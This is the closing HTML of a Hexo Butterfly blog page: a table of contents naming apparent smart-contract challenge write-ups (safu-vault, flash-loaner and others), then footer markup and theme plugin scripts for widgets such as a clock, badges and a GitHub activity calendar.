href="#1-Jpeg-Sniper"><span class="toc-text">1.Jpeg Sniper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safu-vault"><span class="toc-text">safu-vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game-assets"><span class="toc-text">game-assets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safu-wallet"><span class="toc-text">safu-wallet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tasty-stake"><span class="toc-text">tasty-stake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#freebie"><span class="toc-text">freebie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nft-bonanza"><span class="toc-text">nft-bonanza</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#governance-shenanigans"><span class="toc-text">governance-shenanigans</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flash-loaner"><span class="toc-text">flash-loaner</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lsq</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer src="/js/light.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="30" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '113.34532,23.15624';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="https://www.fomal.cc/static/js/runtime.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '1s');
    arr[i].setAttribute('data-wow-offset', '100');
    arr[i].setAttribute('data-wow-iteration', '2');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/about/'|| '/about/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("https://gitcalendar.fomal.cc/api?shaflow01",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'shaflow01')
    }
  </script><!-- hexo injector body_end end --></body></html>